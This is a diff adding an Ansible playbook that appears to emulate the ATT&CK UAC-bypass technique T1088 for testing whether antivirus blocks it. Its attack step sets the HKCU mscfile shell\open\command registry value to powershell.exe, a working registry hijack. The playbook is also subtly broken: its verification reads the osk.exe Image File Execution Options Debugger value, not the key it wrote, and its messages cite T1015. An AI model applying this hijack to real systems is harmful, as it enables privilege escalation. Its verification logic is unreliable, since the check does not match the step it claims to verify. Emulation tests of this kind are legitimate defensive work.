@@ -1,0 +1,31 @@
+# attack_technique: T1088
+- name: T1088 - Bypass User Account Control
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+          - name: Attaches Command Prompt As Debugger To Process - osk
+            #reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /f
+            win_regedit:
+              path: HKCU:\software\classes\mscfile\shell\open\command
+              data: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+              type: string
+          - name: sleep for 10 seconds and continue with play to check if AV removed or Not
+            tags: always
+            wait_for: timeout=10
+            delegate_to: localhost
+          - name: Check REG exist
+            tags: always
+            win_reg_stat:
+              path: HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe
+              name: Debugger
+            register: T1088
+          - name: check if playbook was blocked
+            tags: always
+            debug: msg="Playbook Completed:T1015:blocked:win:"
+            when: (powershell.exe not in T1088.value)       
+          - name: check if playbook was successfull
+            tags: always
+            debug: msg="Playbook Completed:T1015:passed:win:"
+            when: (powershell.exe in T1088.value)          
+      
